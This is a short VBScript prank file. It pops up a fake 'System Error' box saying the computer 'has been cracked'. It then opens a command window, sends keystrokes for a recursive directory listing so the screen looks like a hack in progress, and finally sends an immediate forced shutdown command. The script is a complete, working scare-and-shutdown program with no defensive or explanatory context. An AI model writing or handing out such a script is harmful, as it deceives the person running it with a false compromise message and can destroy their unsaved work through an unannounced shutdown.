MsgBox"Your computer has been cracked",48,"System Error"
Set wshshell = wscript.CreateObject("wscript.shell")
wshshell.run "cmd"
wscript.sleep 1000
wshshell.AppActivate "cmd"
WshShell.Sendkeys "dir /s"
WshShell.Sendkeys "{ENTER}"
Wscript.Sleep 1000
WshShell.Sendkeys "shutdown /s /t 0"
WshShell.Sendkeys "{ENTER}"
